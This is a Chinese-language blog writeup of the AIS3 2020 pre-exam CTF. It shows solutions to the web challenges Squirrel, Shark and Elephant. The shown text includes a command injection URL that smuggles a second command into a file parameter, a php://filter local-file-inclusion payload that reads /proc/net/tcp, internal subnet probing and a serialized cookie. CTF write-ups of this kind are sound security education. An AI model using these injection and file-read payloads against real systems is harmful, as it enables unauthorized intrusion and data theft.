<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>AIS3 2020 Pre-exam Writeup (中文) - Just Still</title>
<meta name="description" content="AIS3 前測時間又到了!">


  <meta name="author" content="Still Hsu">
  
  <meta property="article:author" content="Still Hsu">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Just Still">
<meta property="og:title" content="AIS3 2020 Pre-exam Writeup (中文)">
<meta property="og:url" content="https://stillu.cc/writeup/2020/06/28/ais3-preexam-zh-2020/">


  <meta property="og:description" content="AIS3 前測時間又到了!">



  <meta property="og:image" content="https://stillu.cc/assets/images/posts/ais3-2020-writeup/CRNHLxU.png">



  <meta name="twitter:site" content="@StillAzureH">
  <meta name="twitter:title" content="AIS3 2020 Pre-exam Writeup (中文)">
  <meta name="twitter:description" content="AIS3 前測時間又到了!">
  <meta name="twitter:url" content="https://stillu.cc/writeup/2020/06/28/ais3-preexam-zh-2020/">

  
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="https://stillu.cc/assets/images/posts/ais3-2020-writeup/CRNHLxU.png">
  

  



  <meta property="article:published_time" content="2020-06-28T00:00:00+08:00">





  

  


<link rel="canonical" href="https://stillu.cc/writeup/2020/06/28/ais3-preexam-zh-2020/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Still Hsu",
      "url": "https://stillu.cc/"
    
  }
</script>







<!-- end _includes/seo.html -->



  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Just Still Feed">


<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

<link rel="apple-touch-icon" sizes="57x57" href="/assets/icons/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="/assets/icons/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="/assets/icons/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="/assets/icons/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="/assets/icons/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="/assets/icons/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="/assets/icons/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="/assets/icons/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="/assets/icons/apple-icon-180x180.png">
<link rel="icon" type="image/png" sizes="192x192"  href="/assets/icons/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/icons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96" href="/assets/icons/favicon-96x96.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/icons/favicon-16x16.png">
<link rel="manifest" href="/assets/icons/manifest.json">
<meta name="msapplication-TileColor" content="#F21368">
<meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
<meta name="theme-color" content="#F21368">
  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/avatar-512.png" alt="Just Still"></a>
        
        <a class="site-title" href="/">
          Just Still
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/about">About</a>
            </li><li class="masthead__menu-item">
              <a href="/categories">Posts</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <i class="fas fa-search"></i>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      
  







<div class="page__hero--overlay"
  style="background-color: #000; background-image: linear-gradient(rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0.75)), url('/assets/images/posts/ais3-2020-writeup/CRNHLxU.png');"
>
  
    <div class="wrapper">
      <h1 id="page-title" class="page__title" itemprop="headline">
        
          AIS3 2020 Pre-exam Writeup (中文)

        
      </h1>
      
        <p class="page__lead">AIS3 前測時間又到了!
</p>
      
      

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2020-06-28T00:00:00+08:00">June 28, 2020</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          14 minute read
        
      </span>
    
  </p>


      
      
    </div>
  
  
</div>




  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="https://stillu.cc/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="/categories/#writeup" itemprop="item"><span itemprop="name">Writeup</span></a>
          <meta itemprop="position" content="2" />
        </li>
        <span class="sep">/</span>
      
    
      
      
        
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="/categories/#2020" itemprop="item"><span itemprop="name">2020</span></a>
          <meta itemprop="position" content="3" />
        </li>
        <span class="sep">/</span>
      
    
      
      
        
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="/categories/#06" itemprop="item"><span itemprop="name">06</span></a>
          <meta itemprop="position" content="4" />
        </li>
        <span class="sep">/</span>
      
    
      
      
        
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="/categories/#28" itemprop="item"><span itemprop="name">28</span></a>
          <meta itemprop="position" content="5" />
        </li>
        <span class="sep">/</span>
      
    
      
      
        <li class="current">AIS3 2020 Pre-exam Writeup (中文)</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/assets/images/avatar-512.png" alt="Still Hsu" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Still Hsu</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>Developer, photographer, infosec researcher.</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Taiwan</span>
        </li>
      

      
        
          
            <li><a href="https://twitter.com/StillAzureH" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/Still34" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
            <li><a href="/.well-known/pubkey.asc" rel="nofollow noopener noreferrer"><i class="fas fa-user-lock" aria-hidden="true"></i><span class="label">GPG (Email)</span></a></li>
          
        
      

      

      
        <li>
          <a href="mailto:business@stillu.cc">
            <meta itemprop="email" content="business@stillu.cc" />
            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="AIS3 2020 Pre-exam Writeup (中文)">
    <meta itemprop="description" content="AIS3 前測時間又到了!">
    <meta itemprop="datePublished" content="2020-06-28T00:00:00+08:00">
    

    <div class="page__inner-wrap">
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu"><li><a href="#前言">前言</a></li><li><a href="#web">Web</a><ul><li><a href="#-squirrel-100-pt">🐿 Squirrel (100 pt.)</a></li><li><a href="#-shark-100-pt">🦈 Shark (100 pt.)</a></li><li><a href="#-elephant-168-pt">🐘 Elephant (168 pt.)</a></li><li><a href="#-snake-272-pt">🐍 Snake (272 pt.)</a></li><li><a href="#-rhino-494-pt">🦏 Rhino (494 pt.)</a></li><li><a href="#-owl-492-pt">🦉 Owl (492 pt.)</a></li></ul></li><li><a href="#crypto">Crypto</a><ul><li><a href="#-brontosaurus-100-pt">🦕 Brontosaurus (100 pt.)</a></li><li><a href="#-t-rex-100-pt">🦖 T-Rex (100 pt.)</a></li></ul></li><li><a href="#pwn">Pwn</a><ul><li><a href="#-bof-100-pt">👻 BOF (100 pt.)</a></li></ul></li><li><a href="#reverse">Reverse</a><ul><li><a href="#-tsaibro-100-pt">🍍 TsaiBro (100 pt.)</a></li><li><a href="#-fallen-beat-144-pt">🎹 Fallen Beat (144 pt.)</a></li><li><a href="#-la-vie-en-rose-499-pt">🌹 La vie en rose (499 pt.)</a></li></ul></li><li><a href="#misc">Misc</a><ul><li><a href="#-piquero-100-pt">💤 Piquero (100 pt.)</a></li><li><a href="#-karuego-100-pt">🐥 Karuego (100 pt.)</a></li><li><a href="#-soy-139-pt">🌱 Soy (139 pt.)</a></li><li><a href="#-saburo-359-pt">👑 Saburo (359 pt.)</a></li></ul></li></ul>

            </nav>
          </aside>
        
        <h2 id="前言">前言</h2>

<p>小弟中文不好，如果有中文不通順的地方請見諒 &lt;(＿　＿)&gt;</p>

<p>這次比我去年第一次打的時候有經驗多了，去年差不多100名左右，這次爬到了 43 名。很可惜的，有幾題我都是戳中邊或者是花太多時間在部分題目導致其他幾題沒有多餘時間看完。比如像是 Clara，Clara 那題我很早就看到有問題的封包甚至是 Key Exchange 中的 Key，但是只能說經驗不足，一開始沒意識到我所看到的字串部分是 Key，而加密方式是純粹 XOR。我是在比賽結束後沒多久才發現這回事的。非常可惜因為 Clara 那題 500 分。但整體而言我還是對這次 AIS3 很滿意也覺得又學到了不少，如 Rose 那題，我在之前其實沒有意識到 Python 在執行時會 Compile 成 Bytecode，也趁機學會了這點。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/BOIkrai.png" alt="" /></p>

<h2 id="web">Web</h2>

<h3 id="-squirrel-100-pt">🐿 Squirrel (100 pt.)</h3>

<p>這題一打開會看到一堆到處在跑的松鼠，一開始完全不知道在幹嘛，但那些松鼠上寫的用戶名非常似曾相識… 這些不是常見的Linux使用者帳號嗎？</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/eitKpZA.png" alt="" /></p>

<p>估計是從 <code class="language-plaintext highlighter-rouge">/etc/passwd</code> 翻出來的，咱們來看看這個網頁的原始碼。</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl https://squirrel.ais3.org/
&lt;<span class="o">!</span>DOCTYPE html&gt;

&lt;<span class="nb">head</span><span class="o">&gt;</span>
  &lt;title&gt;🐿️🐿️🐿️🐿️🐿️&lt;/title&gt;
  &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
  &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"css/style.css"</span><span class="o">&gt;</span>
&lt;/head&gt;

&lt;body&gt;
  &lt;template <span class="nb">id</span><span class="o">=</span><span class="s2">"squirrel-template"</span><span class="o">&gt;</span>
    &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"squirrel"</span><span class="o">&gt;</span>
      &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"icon"</span><span class="o">&gt;</span>🐿️&lt;/div&gt;
      &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"name"</span><span class="o">&gt;</span>squirrel&lt;/div&gt;
    &lt;/div&gt;
  &lt;/template&gt;

  &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"js/squirrel.js"</span><span class="o">&gt;</span>&lt;/script&gt;
  &lt;script&gt;
    const squirrelFile <span class="o">=</span> <span class="s1">'/etc/passwd'</span><span class="p">;</span>

    fetch<span class="o">(</span><span class="s1">'api.php?get='</span> + encodeURIComponent<span class="o">(</span>squirrelFile<span class="o">))</span>
      .then<span class="o">(</span>res <span class="o">=&gt;</span> res.json<span class="o">())</span>
      .then<span class="o">(</span>data <span class="o">=&gt;</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="s1">'error'</span> <span class="k">in </span>data<span class="o">)</span> <span class="o">{</span>
          throw data.error<span class="p">;</span>
        <span class="o">}</span>
        data.output.split<span class="o">(</span><span class="s1">'\n'</span><span class="o">)</span>
          .map<span class="o">(</span>line <span class="o">=&gt;</span> line.split<span class="o">(</span><span class="s1">':'</span><span class="o">)[</span>0].trim<span class="o">())</span>
          .filter<span class="o">(</span>name <span class="o">=&gt;</span> name.length<span class="o">)</span>
          .forEach<span class="o">(</span>name <span class="o">=&gt;</span> new Squirrel<span class="o">(</span>name<span class="o">)</span>.update<span class="o">())</span><span class="p">;</span>
      <span class="o">})</span>
      .catch<span class="o">(</span>err <span class="o">=&gt;</span> <span class="o">{</span>
        console.log<span class="o">(</span>err<span class="o">)</span><span class="p">;</span>
        alert<span class="o">(</span><span class="s1">'Something went wrong! Please report this to the author!'</span><span class="o">)</span><span class="p">;</span>
      <span class="o">})</span><span class="p">;</span>
  &lt;/script&gt;
&lt;/body&gt;
</code></pre></div></div>

<p>跟一開始想的一樣，果然是 <code class="language-plaintext highlighter-rouge">/etc/passwd</code> 出來的，而且題目還很好心的告訴我們從哪裡拉這個檔案出來的！這個時候就是開始戳 <code class="language-plaintext highlighter-rouge">api.php</code> 看看會有什麼東西。我們透過 <code class="language-plaintext highlighter-rouge">api.php</code> 的 GET parameter 可以得知這個 PHP 有很大的 LFI (Local File Inclusion) 漏洞。這時我們可以透過它來取得自己的原始碼。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/ZkPkcf7.png" alt="" /></p>

<p>看起來都已經透過 <code class="language-plaintext highlighter-rouge">json_encode</code> 把所有的換行符號替換成 <code class="language-plaintext highlighter-rouge">\n</code>，這時可以透過PowerShell的 string.Replace 把所有的 <code class="language-plaintext highlighter-rouge">\n</code> 換回本地端相容的換行符號以便讀取。</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="n">curl</span><span class="w"> </span><span class="nx">https://squirrel.ais3.org/api.php</span><span class="nf">?</span><span class="nx">get</span><span class="o">=</span><span class="nx">api.php</span><span class="w"> </span><span class="nt">-s</span><span class="p">)</span><span class="o">.</span><span class="nf">replace</span><span class="p">(</span><span class="s1">'\n'</span><span class="p">,[</span><span class="n">System.Environment</span><span class="p">]::</span><span class="nx">NewLine</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<p>之後就可以輕鬆取得可方便讀取的原始碼。</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: application/json'</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'get'</span><span class="p">])</span> <span class="p">{</span>
    <span class="nv">$output</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s2">"cat '</span><span class="nv">$file</span><span class="s2">'"</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$output</span> <span class="o">!==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="nb">json_encode</span><span class="p">([</span>
            <span class="s1">'output'</span> <span class="o">=&gt;</span> <span class="nv">$output</span>
        <span class="p">]);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="nb">json_encode</span><span class="p">([</span>
            <span class="s1">'error'</span> <span class="o">=&gt;</span> <span class="s1">'cannot get file'</span>
        <span class="p">]);</span>
    <span class="p">}</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="nb">json_encode</span><span class="p">([</span>
        <span class="s1">'error'</span> <span class="o">=&gt;</span> <span class="s1">'empty file path'</span>
    <span class="p">]);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>而在 Line 6 我們可以看到一個非常有問題的 <code class="language-plaintext highlighter-rouge">shell_exec</code>，根據官方技術文件可以得知 shell_exec 通常會以使用者 <code class="language-plaintext highlighter-rouge">www</code> 的身分執行任何指令並將 stdout 噴回變數內。而這點危險是危險在當使用者可以存取變數內容時，使用者可以透過 Command Injection 的方式執行任意指令。我們因此可以透過字元逃脫 (character escape) 的方式跳出 <code class="language-plaintext highlighter-rouge">cat '$file'</code> 中的單引號，接著透過分號來執行第二個指令。</p>

<p>所以最終結果的URL是 <code class="language-plaintext highlighter-rouge">https://squirrel.ais3.org/api.php?get=';ls+/'</code></p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"output"</span><span class="p">:</span><span class="w"> </span><span class="s2">"5qu1rr3l_15_4_k1nd_0f_b16_r47.txt</span><span class="se">\n</span><span class="s2">bin</span><span class="se">\n</span><span class="s2">boot</span><span class="se">\n</span><span class="s2">dev</span><span class="se">\n</span><span class="s2">etc</span><span class="se">\n</span><span class="s2">home</span><span class="se">\n</span><span class="s2">lib</span><span class="se">\n</span><span class="s2">lib64</span><span class="se">\n</span><span class="s2">media</span><span class="se">\n</span><span class="s2">mnt</span><span class="se">\n</span><span class="s2">opt</span><span class="se">\n</span><span class="s2">proc</span><span class="se">\n</span><span class="s2">root</span><span class="se">\n</span><span class="s2">run</span><span class="se">\n</span><span class="s2">sbin</span><span class="se">\n</span><span class="s2">srv</span><span class="se">\n</span><span class="s2">sys</span><span class="se">\n</span><span class="s2">tmp</span><span class="se">\n</span><span class="s2">usr</span><span class="se">\n</span><span class="s2">var</span><span class="se">\n</span><span class="s2">"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>大功告成！我們拿到了 <code class="language-plaintext highlighter-rouge">/</code> 底下的目錄，而且剛好我們的flag檔案也在根目錄下！</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="s2">"https://squirrel.ais3.org/api.php?get=/5qu1rr3l_15_4_k1nd_0f_b16_r47.txt"</span> <span class="nt">-s</span> | jq <span class="nt">-C</span>

<span class="o">{</span>
  <span class="s2">"output"</span>: <span class="s2">"AIS3{5qu1rr3l_15_4_k1nd_0f_b16_r47}</span><span class="se">\n</span><span class="s2">"</span>
<span class="o">}</span>
</code></pre></div></div>

<p>Flag:
<code class="language-plaintext highlighter-rouge">AIS3{5qu1rr3l_15_4_k1nd_0f_b16_r47}</code></p>

<h3 id="-shark-100-pt">🦈 Shark (100 pt.)</h3>

<blockquote>
  <p>Let’s dive deep again this year.</p>
</blockquote>

<p>因為去年有打過 AIS3 2019 的關係，所以馬上想到的是去年 dive deeper 的題目，是個用 <code class="language-plaintext highlighter-rouge">php://filter</code> 解的經典LFI題。不管是不是，我們先 curl 看一看再說。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/D44YYq7.png" alt="" /></p>

<p>看到 <code class="language-plaintext highlighter-rouge">?path=hint.txt</code> 感覺又是一個LFI題，我們先看看 <code class="language-plaintext highlighter-rouge">index.php</code> 有沒有存在。</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$path</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'path'</span><span class="p">])</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/^(\.|\/)/'</span><span class="p">,</span> <span class="nv">$path</span><span class="p">))</span> <span class="p">{</span>
            <span class="c1">// disallow /path/like/this and ../this</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">'&lt;pre&gt;[forbidden]&lt;/pre&gt;'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$content</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="kc">FALSE</span><span class="p">,</span> <span class="kc">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1000</span><span class="p">);</span>
        <span class="k">die</span><span class="p">(</span><span class="s1">'&lt;pre&gt;'</span> <span class="mf">.</span> <span class="p">(</span><span class="nv">$content</span> <span class="o">?</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$content</span><span class="p">)</span> <span class="o">:</span> <span class="s1">'[empty]'</span><span class="p">)</span> <span class="mf">.</span> <span class="s1">'&lt;/pre&gt;'</span><span class="p">);</span>
    <span class="p">}</span>

<span class="cp">?&gt;</span>
</code></pre></div></div>
<p>果然有，而且還透過 regex 把常見的危險符號都去掉了！
但是！
<code class="language-plaintext highlighter-rouge">php://</code> 的URI沒有去掉！果然跟去年題目一樣呢！</p>

<p><code class="language-plaintext highlighter-rouge">php://</code> 是什麼呢？ 官方文件寫道：</p>

<blockquote>
  <p>PHP comes with many built-in wrappers for various URL-style protocols for use with the filesystem functions such as fopen(), copy(), file_exists() and filesize(). In addition to these wrappers, it is possible to register custom wrappers using the stream_wrapper_register() function.</p>
</blockquote>

<blockquote>
  <p>php://filter is a kind of meta-wrapper designed to permit the application of filters to a stream at the time of opening. This is useful with all-in-one file functions such as readfile(), file(), and file_get_contents() where there is otherwise no opportunity to apply a filter to the stream prior the contents being read.</p>
</blockquote>

<p>寫的這麼多基本上就是在說這些 PHP protocol 可以用來存取 filesystem 的東西。那麼，對我來說到底能用它做什麼呢？我們來看看這篇 <a href="https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/">Using php://filter for local file inclusion</a>，我們得知可以透過 <code class="language-plaintext highlighter-rouge">php://filter/convert.base64-encode/resource=&lt;targetFile&gt;</code> 來進行 filter evasion。那我們在知道這點之後該做什麼呢？</p>

<p>我們透過 <code class="language-plaintext highlighter-rouge">hint.txt</code> 知道他要我們去挖其他伺服器上的 flag，那我們到底要怎麼知道內網的IP長什麼樣？既然是伺服器，我們可以猜測這台電腦可能與其他電腦伺服器會進行溝通。這時，我們可以透過像是 <code class="language-plaintext highlighter-rouge">/proc/net/tcp</code> 之類的檔案來得知有與這台電腦進行 TCP 連線的動作。</p>

<p>所以我們的 payload 大概可以寫成這樣：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://shark.ais3.org/?path=php://filter/convert.base64-encode/resource=/proc/net/tcp
</code></pre></div></div>

<p>我們實際去執行可以拿到以下 Base64 的字串：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ICBzbCAgbG9jYWxfYWRkcmVzcyByZW1fYWRkcmVzcyAgIHN0IHR4X3F1ZXVlIHJ4X3F1ZXVlIHRyIHRtLT53aGVuIHJldHJuc210ICAgdWlkICB0aW1lb3V0IGlub2RlICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgMDogMDAwMDAwMDA6MDA1MCAwMDAwMDAwMDowMDAwIDBBIDAwMDAwMDAwOjAwMDAwMDAwIDAwOjAwMDAwMDAwIDAwMDAwMDAwICAgICAwICAgICAgICAwIDEwNzc4MjE2NSAxIDAwMDAwMDAwZGJjZjMwZmYgOTkgMCAwIDEwIDAgICAgICAgICAgICAgICAgICAKICAgMTogMEIwMDAwN0Y6QTQzNSAwMDAwMDAwMDowMDAwIDBBIDAwMDAwMDAwOjAwMDAwMDAwIDAwOjAwMDAwMDAwIDAwMDAwMDAwICAgICAwICAgICAgICAwIDEwNzc1OTQwNiAxIDAwMDAwMDAwNTU2M2NmMTIgOTkgMCAwIDEwIDAgICAgICAgICAgICAgICAgICAKICAgMjogMDMwMDE2QUM6MDA1MCAwMTAwMTZBQzo5QTIwIDAxIDAwMDAwMDAwOjAwMDAwMDAwIDAyOjAwMEFGQzdGIDAwMDAwMDAwICAgIDMzICAgICAgICAwIDIwOTIzOTg1MCAyIDAwMDAwMDAwOTBiNTkxNTkgMjAgMyAzMCAxMCAtMSAgICAgICAgICAgICAgICAK
</code></pre></div></div>

<p>這時拿去餵給 Base64 decode 就可以拿到我們的結果了！</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  sl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode                                                     
   0: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 107782165 1 00000000dbcf30ff 99 0 0 10 0                  
   1: 0B00007F:A435 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 107759406 1 000000005563cf12 99 0 0 10 0                  
   2: 030016AC:0050 010016AC:9A20 01 00000000:00000000 02:000AFC7F 00000000    33        0 209239850 2 0000000090b59159 20 3 30 10 -1                
</code></pre></div></div>

<p>那我們要怎麼解讀 <code class="language-plaintext highlighter-rouge">/proc/net/tcp</code> 檔案呢？這時我們可以去看看相關的 <a href="https://metacpan.org/pod/release/SALVA/Linux-Proc-Net-TCP-0.05/lib/Linux/Proc/Net/TCP.pm">man page</a> 來得知如何讀取該檔案。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  46: 010310AC:9C4C 030310AC:1770 01 
  |      |      |      |      |   |--&gt; connection state
  |      |      |      |      |------&gt; remote TCP port number
  |      |      |      |-------------&gt; remote IPv4 address
  |      |      |--------------------&gt; local TCP port number
  |      |---------------------------&gt; local IPv4 address
  |----------------------------------&gt; number of entry
</code></pre></div></div>

<p>我們透過文件得知IP位址是hex-encoded而且是反過來的，所以這樣我們可以推出我們的 subnet 是 <code class="language-plaintext highlighter-rouge">172.22.0.0</code>。這時我們可以一個一個去戳看看，用PowerShell跟 ForEach Parallel 我們可以很快地就戳到我們的結果。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/EONCWZz.png" alt="" /></p>

<p>Flag:
<code class="language-plaintext highlighter-rouge">AIS3{5h4rk5_d0n'7_5w1m_b4ckw4rd5}</code></p>

<h3 id="-elephant-168-pt">🐘 Elephant (168 pt.)</h3>

<blockquote>
  <p>Do elephants love cookies?</p>
</blockquote>

<p>馬上聯想到這題應該是跟 Cookie 有關的題目。我們一開始會先看到這樣的登入頁面。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/fuCZyzW.png" alt="" /></p>

<p>我們這時可以透過 Fiddler 來看看按下登入時會有什麼連線。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#	Result	Protocol	Host	URL	Body	Caching	Content-Type	Process	Comments	Custom	
6	302	HTTPS	elephant.ais3.org	/	0		text/html; charset=UTF-8	msedge:10224			
7	200	HTTPS	elephant.ais3.org	/	504		text/html; charset=UTF-8	msedge:10224			
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 302 Found
Server: nginx/1.18.0
Date: Tue, 16 Jun 2020 13:09:40 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 0
Connection: keep-alive
X-Powered-By: PHP/7.4.6
Location: /
Set-Cookie: elephant_user=Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NzoiYXNkZmFzZCI7czoxMToiAFVzZXIAdG9rZW4iO3M6MzI6ImYyOGEzNzk4Njg4ZDI4ZTE1MDY5MWE5Mjc4NDZlYjM2Ijt9; expires=Tue, 16-Jun-2020 13:19:40 GMT; Max-Age=600
</code></pre></div></div>

